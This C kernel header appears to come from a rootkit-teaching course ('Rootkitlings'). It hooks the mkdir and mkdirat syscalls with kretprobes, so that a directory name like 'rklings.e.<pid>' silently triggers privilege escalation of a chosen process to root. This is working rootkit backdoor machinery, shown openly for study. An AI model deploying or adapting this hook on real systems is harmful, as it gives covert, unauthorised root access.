/* SPDX-License-Identifier: GPL-2.0 */
#ifndef _RKLINGS_HOOK_H
#define _RKLINGS_HOOK_H
/*
 * Supplied mkdir interception layer for Rootkitlings L05-L07.
 *
 * This version recognizes rklings.e and rklings.e.<pid>, selects the target,
 * suppresses the real mkdir, and reports rk_escalate_pid's result.
 *
 * L08 opens this mechanism and implements it directly.
 *
 * Hooks both __x64_sys_mkdir and __x64_sys_mkdirat so the interception
 * works regardless of which syscall the userspace libc uses.
 */

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/pid.h>
#include <linux/ptrace.h>
#include <linux/sched/task.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_HOOK_PATH_MAX 128

struct __rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_escalate_pid(pid_t pid);

static int __rk_do_entry(struct kretprobe_instance *inst, struct pt_regs *regs,
			 const char __user *pathname)
{
	struct __rk_mkdir_data *data = (void *)inst->data;
	char buf[RK_HOOK_PATH_MAX];
	long copied;
	const char *base;
	pid_t pid;
	int ret;

	data->intercepted = false;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;
	if (copied == sizeof(buf))
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;
	if (strncmp(base, "rklings.e", 9) != 0)
		return 0;
	if (base[9] != '\0' && base[9] != '.')
		return 0;
	if (base[9] == '\0') {
		pid = task_ppid_nr(current);
		ret = 0;
	} else {
		ret = kstrtoint(base + 10, 10, &pid);
		if (!ret && pid <= 0)
			ret = -EINVAL;
	}

	if (put_user('\0', (char __user *)pathname))
		return 0;
	data->intercepted = true;
	data->result = ret ? ret : rk_escalate_pid(pid);
	if (!data->result)
		pr_info("rklings: escalated pid %d to root\n", pid);
	return 0;
}

/* mkdir(pathname, mode): pathname in di */
static int __rk_entry_mkdir(struct kretprobe_instance *inst,
			    struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return __rk_do_entry(inst, regs, (const char __user *)uregs->di);
}

/* mkdirat(dfd, pathname, mode): pathname in si */
static int __rk_entry_mkdirat(struct kretprobe_instance *inst,
			      struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return __rk_do_entry(inst, regs, (const char __user *)uregs->si);
}

static int __rk_return(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct __rk_mkdir_data *data = (void *)inst->data;

	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe __rk_probe_mkdir = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler = __rk_entry_mkdir,
    .handler = __rk_return,
    .data_size = sizeof(struct __rk_mkdir_data),
    .maxactive = 8,
};

static struct kretprobe __rk_probe_mkdirat = {
    .kp.symbol_name = "__x64_sys_mkdirat",
    .entry_handler = __rk_entry_mkdirat,
    .handler = __rk_return,
    .data_size = sizeof(struct __rk_mkdir_data),
    .maxactive = 8,
};

static inline int rk_hook_start(void)
{
	int ret;

	ret = register_kretprobe(&__rk_probe_mkdir);
	if (ret)
		return ret;
	ret = register_kretprobe(&__rk_probe_mkdirat);
	if (ret) {
		unregister_kretprobe(&__rk_probe_mkdir);
		return ret;
	}
	return 0;
}

static inline void rk_hook_stop(void)
{
	unregister_kretprobe(&__rk_probe_mkdirat);
	unregister_kretprobe(&__rk_probe_mkdir);
}

#endif /* _RKLINGS_HOOK_H */
